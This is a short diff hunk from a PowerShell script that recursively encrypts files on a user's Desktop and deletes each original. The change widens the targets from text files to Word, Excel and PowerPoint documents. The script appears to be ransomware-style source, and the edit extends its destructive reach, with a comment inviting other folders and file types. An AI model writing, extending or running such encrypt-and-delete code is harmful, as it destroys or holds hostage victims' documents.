@@ -395,7 +395,7 @@ Function Encr{param([string]$i,[string]$p)
 
 #foreach ($i in $(Get-ChildItem C:/temp/ -recurse -include *.txt | ForEach-Object { $_.FullName })){
 # Replace C:\tools with the folder you want to encrypt. Also you can add or modify the file types by comma seperated - *.txt, *.jpg, *.png etc.
-foreach ($i in $(Get-ChildItem C:\Users\Hunter\Desktop -recurse -include *.txt  | ForEach-Object { $_.FullName })){ 
+foreach ($i in $(Get-ChildItem C:\Users\Hunter\Desktop -recurse -include *.txt, *.doc, *.docx, *.xls, *.xlsx, *.ppt, *.pptx  | ForEach-Object { $_.FullName })){ 
   Encr -i $i -p $pwd
   rm $i
 }
